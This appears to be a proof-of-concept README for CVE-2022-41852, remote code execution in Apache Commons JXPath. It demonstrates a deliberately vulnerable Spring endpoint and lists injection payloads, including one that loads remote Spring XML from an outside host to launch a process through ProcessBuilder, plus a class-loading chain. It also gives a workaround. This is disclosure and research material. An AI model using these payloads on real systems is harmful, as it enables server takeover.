# Remote Code Execution in JXPath Library (CVE-2022-41852) Proof of Concept

CVE-2022-41852 allows attackers to execute code on the application server.

You can read more about this vulnerability here:
- https://hackinglab.cz/en/blog/remote-code-execution-in-jxpath-library-cve-2022-41852/

<i><b>Note:</b> I am not an author of this CVE. I have only created this proof of concept.</i>

## Useful Links
- [JXPath GitHub](https://github.com/apache/commons-jxpath)
- [JXPath Website](https://commons.apache.org/proper/commons-jxpath/users-guide.html)
- [MITRE CVE-2022-41852](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-41852)
- [NIST CVE-2022-41852](https://nvd.nist.gov/vuln/detail/CVE-2022-41852)

## Vulnerability Description
JXPath library has support for running functions in XPath expressions 
(see [Official User Guide](https://commons.apache.org/proper/commons-jxpath/users-guide.html#Standard_Extension_Functions)).

For example, methods `JXPathContext.getValue(path)` and `JXPathContext.iterate(path)` are dangerous 
if you let user send input into the path parameter.

## PoC Description
This PoC starts simple Spring server with two endpoints:

- `/vulnerable-example?path=[path]`
- `/secure-example?path=[path]`

These endpoints have only one query parameter "path". 

### Possible Request URLs
Following requests will work fine (will not cause any problems):
- http://localhost:8080/secure-example?path=name
- http://localhost:8080/secure-example?path=website
- http://localhost:8080/secure-example?path=/
- http://localhost:8080/vulnerable-example?path=name
- http://localhost:8080/vulnerable-example?path=website
- http://localhost:8080/vulnerable-example?path=/

Following requests will cause code to be executed:
- http://localhost:8080/vulnerable-example?path=java.lang.System.exit(42)
- http://localhost:8080/vulnerable-example?path=java.lang.Thread.sleep(10000)

## Example Payloads
Example payloads to detect CVE-2022-41852:
- `java.lang.System.exit(42)`
- `java.lang.Thread.sleep(10000)`
- `/|java.lang.System.exit(42)`
- `|java.lang.System.exit(42)`

There might be various ways to execute commands. One of them is using Spring's ClassPathXmlApplicationContext:
- `org.springframework.context.support.ClassPathXmlApplicationContext.new("https://warxim.com/calc.xml")`

In the XML file, you can define bean configuration, for example, you can create instance of `ProcessBuilder`
and run specified command on the server by initializing the bean using `start()` method. 
In the following example, calculator will be opened on Windows machine:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<beans xmlns="http://www.springframework.org/schema/beans" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd">
  <bean id="commandRunner" class="java.lang.ProcessBuilder" init-method="start">
    <constructor-arg>
      <list>
        <value>cmd</value>
        <value>/c</value>
        <value><![CDATA[calc]]></value>
      </list>
    </constructor-arg>
  </bean>
</beans>
```

There is also a way to load new classes by traversing the context bean, for example, the following code will load class `com.warxim.dangerous.DangerousClass`, create its instance and call method `run("warxim")`:
```java
JXPathContext context = JXPathContext.newContext(new Data());
String jxPath = "run(newInstance(loadClass(getClassLoader(getClass(/)), \"com.warxim.dangerous.DangerousClass\")), \"warxim\")"
Object result = context.getValue(jxPath);
```
Notice that we have to call the object methods by putting the object that contains them as a first parameter.

## Workaround for CVE-2022-41852

It is possible to disable functions in JXPathContext by setting functions field to empty `FunctionLibrary`.
```java
// Create path context for person object
var pathContext = JXPathContext.newContext(person);

// Set empty function library
pathContext.setFunctions(new FunctionLibrary());

// getValue will throw org.apache.commons.jxpath.JXPathFunctionNotFoundException
return pathContext.getValue(path);
```
<i><b>Note:</b> It will disable all functions, so even functions like `size()` will not be available.</i>

## Fix
The fix is being developed, see https://github.com/apache/commons-jxpath/pull/26
